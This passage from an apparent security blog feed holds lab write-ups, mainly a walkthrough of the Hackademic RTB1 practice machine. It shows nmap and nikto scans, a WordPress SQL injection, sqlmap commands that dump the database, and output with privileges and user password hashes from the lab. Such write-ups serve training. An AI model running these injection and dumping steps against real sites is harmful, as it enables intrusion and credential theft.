class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">63</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">0</span><span class="nx">A</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="s2">&quot;black&quot;</span><span class="o">&gt;&amp;</span><span class="nx">rsquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="p">}</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="k">else</span><span class="p">{</span> <span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">You</span> <span class="nx">are</span> <span class="nx">trying</span> <span class="nx">to</span> <span class="nx">login</span> <span class="nx">with</span> <span class="nx">wrong</span> <span class="nx">credentials</span><span class="o">!&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="nx">h2</span><span class="o">&gt;&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">Please</span> <span class="k">try</span> <span class="nx">again</span><span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After decoding the hex characters and converting binary digits in ruby:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>irb(main):017:0>  [0b00110001, 0b00110000, 0b00110000, 0b00110001, 0b00111010, 0b00110001, 0b00110001, 0b00110000, 0b00110001, 0b00111010, 0b00110001, 0b00110000, 0b00110001, 0b00110001, 0b00111010, 0b00110001, 0b00110000, 0b00110000, 0b00110001].map{|x|x.chr}.join
</span><span class='line'>=> &ldquo;1001:1101:1011:1001&rdquo;</span></code></pre></td></tr></table></div></figure></p>

<p>So the SQLi test is validated using string compare operator and it&rsquo;s quite
non-realistic (and unfair) to have two statements with the different case, that
was the reason why we didn&rsquo;t found out this firstly.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackademic: RTB1]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/29/hackademic-rtb1/"/>
    <updated>2015-05-29T14:32:12+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/29/hackademic-rtb1</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/hackademic-rtb1,17/">Hackademic: RTB1</a></p>

<p>We gained the IP address 192.168.80.146 for our testing target.</p>

<p>Nmap output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap 192.168.80.146 -sV -p-&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Starting Nmap 6.47 ( &lt;a href="http://nmap.org">http://nmap.org&lt;/a> ) at 2015-04-28 17:14 CEST
</span><span class='line'>Nmap scan report for 192.168.80.146
</span><span class='line'>Host is up (0.00032s latency).
</span><span class='line'>Not shown: 65533 filtered ports
</span><span class='line'>PORT   STATE  SERVICE VERSION
</span><span class='line'>22/tcp closed ssh
</span><span class='line'>80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
</span><span class='line'>MAC Address: 00:0C:29:01:8A:4D (VMware)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Service detection performed. Please report any incorrect results at &lt;a href="http://nmap.org/submit/">http://nmap.org/submit/&lt;/a> .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 153.05 seconds</span></code></pre></td></tr></table></div></figure></p>

<p>Nikto output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h 192.168.80.146&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>- Nikto v2.1.6&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Target IP:          192.168.80.146&lt;/li>
</span><span class='line'>&lt;li>Target Hostname:    192.168.80.146&lt;/li>
</span><span class='line'>&lt;li>Target Port:        80
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Start Time:         2015-04-28 17:18:04 (GMT2)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Server: Apache/2.2.15 (Fedora)&lt;/li>
</span><span class='line'>&lt;li>Server leaks inodes via ETags, header found with file /, inode: 12748, size: 1475, mtime: Sun Jan  9 18:22:11 2011&lt;/li>
</span><span class='line'>&lt;li>The anti-clickjacking X-Frame-Options header is not present.&lt;/li>
</span><span class='line'>&lt;li>Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.&lt;/li>
</span><span class='line'>&lt;li>Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE&lt;/li>
</span><span class='line'>&lt;li>OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3268: /icons/: Directory indexing found.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3233: /icons/README: Apache default file found.&lt;/li>
</span><span class='line'>&lt;li>7354 requests: 0 error(s) and 7 item(s) reported on remote host
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>End Time:           2015-04-28 17:18:15 (GMT2) (11 seconds)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>1 host(s) tested</span></code></pre></td></tr></table></div></figure></li>
</ul>


<p>There was SQL injection on the web page, vulnerable wordpress instance:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.146/Hackademic_RTB1/?cat=1">http://192.168.80.146/Hackademic_RTB1/?cat=1&lt;/a>'
</span><span class='line'>SELECT * FROM wp_categories WHERE cat_ID = 1\\&lsquo; LIMIT 1</span></code></pre></td></tr></table></div></figure></p>

<p>This will take longer and it&rsquo;s not necessery to dump everything:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u &ldquo;&lt;a href="http://192.168.80.146/Hackademic_RTB1/?cat=1">http://192.168.80.146/Hackademic_RTB1/?cat=1&lt;/a>&rdquo; &ndash;dump-all</span></code></pre></td></tr></table></div></figure></p>

<p>Some of the output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&ndash;current-user:
</span><span class='line'>current user:    &lsquo;root@localhost&rsquo;
</span><span class='line'>&ndash;current-db:
</span><span class='line'>current database:    &lsquo;wordpress&rsquo;
</span><span class='line'>&ndash;privileges:
</span><span class='line'>[&lt;em>] &lsquo;root&rsquo;@&lsquo;localhost&rsquo; (administrator) [27]:
</span><span class='line'>    privilege: ALTER
</span><span class='line'>    privilege: ALTER ROUTINE
</span><span class='line'>    privilege: CREATE
</span><span class='line'>    privilege: CREATE ROUTINE
</span><span class='line'>    privilege: CREATE TEMPORARY TABLES
</span><span class='line'>    privilege: CREATE USER
</span><span class='line'>    privilege: CREATE VIEW
</span><span class='line'>    privilege: DELETE
</span><span class='line'>    privilege: DROP
</span><span class='line'>    privilege: EVENT
</span><span class='line'>    privilege: EXECUTE
</span><span class='line'>    privilege: FILE
</span><span class='line'>    privilege: INDEX
</span><span class='line'>    privilege: INSERT
</span><span class='line'>    privilege: LOCK TABLES
</span><span class='line'>    privilege: PROCESS
</span><span class='line'>    privilege: REFERENCES
</span><span class='line'>    privilege: RELOAD
</span><span class='line'>    privilege: REPLICATION CLIENT
</span><span class='line'>    privilege: REPLICATION SLAVE
</span><span class='line'>    privilege: SELECT
</span><span class='line'>    privilege: SHOW DATABASES
</span><span class='line'>    privilege: SHOW VIEW
</span><span class='line'>    privilege: SHUTDOWN
</span><span class='line'>    privilege: SUPER
</span><span class='line'>    privilege: TRIGGER
</span><span class='line'>    privilege: UPDATE
</span><span class='line'>&ndash;passwords:
</span><span class='line'>database management system users password hashes:
</span><span class='line'>[&lt;/em>] root [1]:
</span><span class='line'>    password hash: 2eaec110380126d7</span></code></pre></td></tr></table></div></figure></p>

<p>The wordpress could be scanned using wpscan too:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# wpscan &lt;a href="http://192.168.80.146/Hackademic_RTB1">http://192.168.80.146/Hackademic_RTB1&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# cat wp_users.csv
</span><span class='line'>ID,user_idmode,user_ip,user_icq,user_msn,user_yim,user_url,user_aim,user_pass,user_login,user_level,user_email,user_status,user_domain,user_browser,user_nicename,user_nickname,user_lastname,user_firstname,user_registered,user_description,user_activation_key
</span><span class='line'>1,login,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,21232f297a57a5a743894a0e4a801fc3,NickJames,1,NickJames@hacked.com,0,&lt;blank>,&lt;blank>,nickjames,NickJames,James,Nick,2010-10-25 20:40:23,&lt;blank>,&lt;blank>
</span><span class='line'>2,login,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,b986448f0bb9e5e124ca91d3d650f52c,JohnSmith,0,JohnSmith@hacked,0,&lt;blank>,&lt;blank>,johnsmith,JohnSmith,Smith,John,2010-10-25 21:25:22,&lt;blank>,&lt;blank>
</span><span class='line'>3,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,7cbb3252ba6b7e9c422fac5334d22054,GeorgeMiller,10,GeorgeMiller@hacked.com,0,&lt;blank>,&lt;blank>,georgemiller,GeorgeMiller,Miller,George,2011-01-07 03:08:51,&lt;blank>,&lt;blank>
</span><span class='line'>4,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,a6e514f9486b83cb53d8d932f9a04292,TonyBlack,0,TonyBlack@hacked.com,0,&lt;blank>,&lt;blank>,tonyblack,TonyBlack,Black,Tony,2011-01-07 03:09:55,&lt;blank>,&lt;blank>
</span><span class='line'>5,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,8601f6e1028a8e8a966f6c33fcd9aec4,JasonKonnors,0,JasonKonnors@hacked.com,0,&lt;blank>,&lt;blank>,jasonkonnors,JasonKonnors,Konnors,Jason,2011-01-07 03:10:36,&lt;blank>,&lt;blank>
</span><span class='line'>6,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,50484c19f1afdaf3841a0d821ed393d2,MaxBucky,0,MaxBucky@hacked.com,0,&lt;blank>,&lt;blank>,maxbucky,MaxBucky,Bucky,Max,2011-01-07 03:11:18,&lt;blank>,&lt;blank></span></code></pre></td></tr></table></div></figure></p>

